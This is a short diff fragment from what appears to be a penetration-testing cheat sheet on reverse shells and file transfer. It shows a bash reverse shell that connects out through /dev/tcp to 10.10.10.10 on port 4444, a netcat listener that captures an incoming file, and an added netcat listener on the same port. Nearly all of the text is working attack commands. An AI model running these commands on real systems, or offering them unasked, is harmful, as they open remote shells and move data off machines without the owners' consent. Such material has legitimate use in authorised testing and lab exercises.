@@ -41,6 +41,10 @@ Kali:   ```nc -lvp 4444 > file.txt```
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
 
+```
+nc -lvp 4444
+```
+
 ### With netcat
 
 ```
